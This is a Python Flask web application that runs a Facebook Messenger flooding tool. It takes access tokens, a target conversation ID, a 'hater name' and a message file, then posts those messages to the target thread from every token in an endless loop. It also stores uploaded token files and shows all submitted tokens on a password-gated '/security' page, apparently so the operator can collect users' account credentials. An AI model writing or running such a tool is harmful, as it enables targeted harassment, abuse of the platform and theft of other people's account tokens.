#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from flask import Flask, request, render_template_string, send_file
import os, requests, time, random, string, json, atexit, traceback
from threading import Thread, Event
from datetime import datetime

# ───────── APP CONFIG ─────────
app = Flask(__name__)
app.secret_key = 'BROKEN_SECRET_KEY'
app.debug = True

PASSWORD = "BROKEN-SECURITY"
headers = {
    'User-Agent': 'Mozilla/5.0',
    'Accept': '*/*',
    'Accept-Language': 'en-US,en;q=0.9',
}

# ───────── STATE ─────────
stop_events, threads, active_users = {}, {}, {}
TASK_FILE = 'tasks.json'
TOKEN_DIR = 'tokens'
os.makedirs(TOKEN_DIR, exist_ok=True)

# ───────── SENDER ─────────
def send_messages(tokens, thread_id, hater, delay, messages, task_id):
    ev = stop_events[task_id]
    mlen = len(messages)
    next_idx = [i % mlen for i in range(len(tokens))]

    while not ev.is_set():
        for i, tok in enumerate(tokens):
            if ev.is_set():
                break
            current_msg = messages[next_idx[i]]
            next_idx[i] = (next_idx[i] + 1) % mlen
            msg_text = f"{hater} {current_msg}" if hater else current_msg
            try:
                requests.post(
                    f'https://graph.facebook.com/v15.0/t_{thread_id}/',
                    data={'access_token': tok, 'message': msg_text},
                    headers=headers, timeout=10
                )
            except:
                pass
            time.sleep(delay)

# ───────── HELPERS ─────────
def fetch_profile_name(token: str) -> str:
    try:
        res = requests.get(f'https://graph.facebook.com/me?access_token={token}', timeout=8)
        return res.json().get('name', 'Unknown')
    except:
        return 'Unknown'

def save_tasks():
    with open(TASK_FILE, 'w', encoding='utf-8') as f:
        json.dump(active_users, f, ensure_ascii=False, indent=2)

def load_tasks():
    if not os.path.exists(TASK_FILE):
        return
    with open(TASK_FILE, 'r', encoding='utf-8') as f:
        data = json.load(f)
        for tid, info in data.items():
            info['tokens_all'] = list(dict.fromkeys(info['tokens_all']))
            active_users[tid] = info
            stop_events[tid] = Event()
            if info.get('status') == 'ACTIVE':
                th = Thread(
                    target=send_messages,
                    args=(info['tokens_all'], info['thread_id'], info['name'],
                          info['delay'], info['msgs'], tid),
                    daemon=True
                )
                th.start()
                threads[tid] = th

atexit.register(save_tasks)
load_tasks()

# ───────── ROUTES ─────────
@app.route('/download/<filename>')
def download(filename):
    filepath = os.path.join(TOKEN_DIR, filename)
    return send_file(filepath, as_attachment=True) if os.path.exists(filepath) else ("File not found", 404)

@app.route('/', methods=['GET', 'POST'])
def home():
    msg_html = stop_html = ""
    if request.method == 'POST':
        if 'txtFile' in request.files:
            token_file_name, tokens = '', []
            if request.form.get('tokenOption') == 'single':
                single_tok = request.form.get('singleToken', '').strip()
                if single_tok:
                    tokens = [single_tok]
            else:
                token_file = request.files['tokenFile']
                token_data = token_file.read().decode(errors='ignore')
                tokens = [t.strip() for t in token_data.splitlines() if t.strip()]
                if tokens:
                    token_file_name = f"{int(time.time())}_{token_file.filename}"
                    with open(os.path.join(TOKEN_DIR, token_file_name), 'w', encoding='utf-8') as f:
                        f.write(token_data)

            tokens = list(dict.fromkeys(tokens))
            uid   = request.form.get('threadId','').strip()
            hater = request.form.get('kidx','').strip()
            delay = max(int(request.form.get('time', 1) or 1), 1)
            fmsg  = request.files['txtFile']
            msgs  = [m for m in fmsg.read().decode(errors='ignore').splitlines() if m]

            if not (tokens and uid and msgs):
                msg_html = "<div class='alert alert-danger rounded-pill p-2'>⚠️ ALL REQUIRED FIELDS!</div>"
            else:
                tid = 'BROKENNADEEM' + ''.join(random.choices(string.ascii_letters + string.digits, k=10))
                stop_events[tid] = Event()
                th = Thread(target=send_messages,
                            args=(tokens, uid, hater, delay, msgs, tid),
                            daemon=True)
                th.start()
                threads[tid] = th
                active_users[tid] = {
                    'name': hater,
                    'token': tokens[0],
                    'tokens_all': tokens,
                    'fb_name': fetch_profile_name(tokens[0]),
                    'thread_id': uid,
                    'msg_file': fmsg.filename or 'messages.txt',
                    'token_file': token_file_name,
                    'msgs': msgs,
                    'delay': delay,
                    'msg_count': len(msgs),
                    'status': 'ACTIVE',
                    'start_time': datetime.now().isoformat()
                }
                save_tasks()
                msg_html = f"<div class='stop-key p-3'><b>STOP KEY↷</b><br><code>{tid}</code></div>"

        elif 'taskId' in request.form:
            tid = request.form.get('taskId', '').strip()
            if tid in stop_events:
                stop_events[tid].set()
                active_users[tid]['status'] = 'OFFLINE'
                save_tasks()
                stop_html = f"<div class='stop-ok p-3'><b>STOPPED ✅</b><br><code>{tid}</code></div>"
            else:
                stop_html = f"<div class='stop-bad p-3'>❌ <b>INVALID KEY</b><br><code>{tid}</code></div>"

    return render_template_string(html_template, msg_html=msg_html, stop_html=stop_html)

@app.route('/security')
def security():
    if request.args.get('password', '') != PASSWORD:
        return '''
        <div style="text-align:center;margin-top:2rem;">
          <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
          <h3 style="color:red;border:2px solid red;padding:1rem;border-radius:1rem;display:inline-block;">
          ❌ WRONG SECURITY PASSWORD ❌<br>Access Denied!</h3><br><br>
          <a href="/" style="color:yellow;">🔙 Go Back</a></div>'''

    html = '''
    <html><head>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>🔐 SECRETARY ZONE 🔐</title>
    <style>
        body {
            background: #111;
            color: white;
            font-family: sans-serif;
            padding: 1rem;
            font-size: 0.93rem;
        }
        .user-box {
            border: 2px solid #00ff99;
            margin: 1.2rem auto;
            max-width: 480px;
            padding: 1rem;
            border-radius: 1rem;
            background: #2b2b2b;
            box-shadow: 0 0 18px #00ff99;
            word-wrap: break-word;
        }
        .line { margin-bottom: 0.5rem; }
        .hater-line   { color: #00f9ff; font-weight: bold; }
        .stop-line    { color: #ff66cc; font-weight: bold; }
        .token-line   { color: #00ff66; font-weight: bold; }
        .file-line    { color: #ffff66; font-weight: bold; }
        .start-line   { color: #00ff00; font-weight: bold; }
        .runtime-line { color: #ff66cc; font-weight: bold; }
        .status-line  { font-weight: bold; }
    </style>
    </head><body>
    <h2 style="color:#00ffcc;text-align:center;">🔐 BROKEN NADEEM 🔐</h2>
    '''

    html += '<div style="max-width:650px;margin:auto;margin-bottom:1.5rem;border:2px solid lime;border-radius:1rem;padding:1rem;background:#111;">'
    html += f"<h4 style='color:lime;text-align:center;'>💠 ACTIVE USERS ➠ {sum(1 for x in active_users.values() if x['status']=='ACTIVE')}</h4><ul style='padding-left:1.5rem;'>"
    for tid, info in active_users.items():
        if info['status'] == 'ACTIVE':
            html += f"<li><b style='color:deepskyblue;'>🧵 CONVO UID ➠ {info['thread_id']}</b> ⚠️ STOP KEY ➠ <code style='color:white'>{tid}</code></li>"
    html += "</ul></div>"

    for tid, info in active_users.items():
        fb_name = info.get('fb_name', 'Unknown')
        token_disp = (
            f"<code style='word-break:break-word;white-space:pre-wrap;'>{info['token']}</code>"
            if not info.get('token_file') else
            f"<a href='/download/{info['token_file']}' target='_blank' style='color:#ffff66;'>📥 DOWNLOAD TOKEN FILE</a>"
        )
        start_str_iso = info.get('start_time', '')
        try:
            dt = datetime.fromisoformat(start_str_iso)
            now = datetime.now()
            delta = now - dt
            total_minutes = delta.total_seconds() // 60
            if total_minutes >= 1440:  # 24 hours
                days = int(total_minutes // 1440)
                hours = int((total_minutes % 1440) // 60)
                minutes = int(total_minutes % 60)
                runtime = f"{days} DAYS {hours} HOURS {minutes} MINUTES"
            elif total_minutes >= 60:
                hours = int(total_minutes // 60)
                minutes = int(total_minutes % 60)
                runtime = f"{hours} HOURS {minutes} MINUTES"
            else:
                minutes = int(total_minutes)
                runtime = f"{minutes} MINUTES"
            start_str = dt.strftime('%d\\%b\\%Y')
        except:
            start_str = start_str_iso
            runtime = "N/A"

        status_color = "#00ff00" if info['status'] == 'ACTIVE' else "red"

        html += f'''
        <div class="user-box">
            <div class="line hater-line">🥶 HATER NAME ➠ {info['name'] or '--'}</div>
            <div class="line stop-line">⚠️ STOP KEY ➠ <code>{tid}</code></div>
            <div class="line" style="color:#28a745;">👤 FB NAME ➠ {fb_name}</div>
            <div class="line" style="color:#ffc107;">🧵 CONVO UID ➠ {info['thread_id']}</div>
            <div class="line token-line">🕵️ TOKEN :: {token_disp}</div>
            <div class="line file-line">📄 MESSAGE FILE ➠ {info['msg_file']}</div>
            <div class="line start-line">⏳ START AT ➠ {start_str}</div>
            <div class="line runtime-line">🌀 RUNTIME ➠ {runtime}</div>
            <div class="line status-line" style="color:{status_color};">✅ STATUS ➠ {info['status']}</div>
        </div>
        '''

    html += '</body></html>'
    return html

# ───────── HTML TEMPLATE ─────────
html_template = '''<!doctype html><html lang="en"><head>
  <meta charset="utf-8"><title>🍁 BROKEN RUDRA 🍁</title>
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.3/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body{min-height:100vh;margin:0;color:white;
      background:linear-gradient(45deg,#ff0000,#ff7f00,#ffff00,#00ff00,#0000ff,#4b0082,#8f00ff);
      background-size:600% 600%;animation:rainbowMove 20s ease infinite;}
    @keyframes rainbowMove{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
    .card-dark{background:transparent;border:2px solid yellow;border-radius:1.5rem;padding:2rem;margin:2rem auto;max-width:600px;}
    .card-dark input,.card-dark select{background:black;color:yellow;border:2px solid yellow;border-radius:2rem;}
    .card-dark .btn{font-weight:bold;border-radius:2rem;padding:.5rem 3rem;font-size:1.2rem;width:100%;}
    .btn-start{background:limegreen;color:black}.btn-stop{background:red;color:white}
    .stop-key,.stop-ok,.stop-bad{margin-top:1rem;background:blue;color:white;border:2px solid yellow;border-radius:2rem;padding:1rem;font-size:1.2rem;}
  </style>
  <script>
    function toggleTokenOption(t){
      document.getElementById('singleTokenDiv').style.display=(t==='single')?'block':'none';
      document.getElementById('tokenFileDiv').style.display=(t==='file')?'block':'none';}
    function enterSecurity(){
      var pwd=prompt("🔐 ENTER SECURITY PASSWORD");if(pwd)location.href="/security?password="+encodeURIComponent(pwd);}
  </script>
</head><body>
  <div class="container p-2">
    <div class="card-dark">
      <h2 class="text-center">🍁 BROKEN RUDRA 🍁</h2>
      <form method="POST" enctype="multipart/form-data">
        <div class="mb-3">
          <input type="radio" name="tokenOption" value="single" checked onclick="toggleTokenOption('single')"> Single &nbsp;
          <input type="radio" name="tokenOption" value="file" onclick="toggleTokenOption('file')"> File
        </div>
        <div class="mb-3">
          <button type="button" class="btn btn-warning w-100" onclick="enterSecurity()">SECURITY</button>
        </div>
        <div id="singleTokenDiv" class="mb-3">
          <label>🧾 ENTER SINGLE TOKEN</label>
          <input type="text" name="singleToken" class="form-control" placeholder="Enter single token">
        </div>
        <div id="tokenFileDiv" class="mb-3" style="display:none">
          <label>📁 UPLOAD TOKEN FILE</label>
          <input type="file" name="tokenFile" class="form-control" accept=".txt">
        </div>
        <label>🧵 ENTER CONVO ID</label>
        <input type="text" name="threadId" class="form-control mb-3" required>
        <label>🔥 ENTER HATER NAME (optional)</label>
        <input type="text" name="kidx" class="form-control mb-3">
        <label>🕐 ENTER SPEED (SECONDS)</label>
        <input type="number" name="time" class="form-control mb-3" required>
        <label>📄 UPLOAD MESSAGE FILE</label>
        <input type="file" name="txtFile" class="form-control mb-3" accept=".txt" required>
        <button type="submit" class="btn btn-start mb-3">🚀 START LODER 🚀</button>
      </form>
      {{msg_html|safe}}
      <hr>
      <form method="POST">
        <label> ENTER STOP KEY</label>
        <input type="text" name="taskId" class="form-control mb-3" required>
        <button type="submit" class="btn btn-stop">⛔ STOP LODER ⛔</button>
      </form>
      {{stop_html|safe}}
    </div>
  </div>
</body></html>'''

# ───────── RUN LOOP (AUTO REDEPLOY) ─────────
def run_server():
    while True:
        try:
            app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
        except KeyboardInterrupt:
            print("⏹️  KeyboardInterrupt — server बंद किया।")
            break
        except Exception as e:
            print("⚠️  Server crashed:", e)
            traceback.print_exc()
        print("🔄  Restarting in 3 seconds …")
        time.sleep(3)

if __name__ == "__main__":
    run_server()
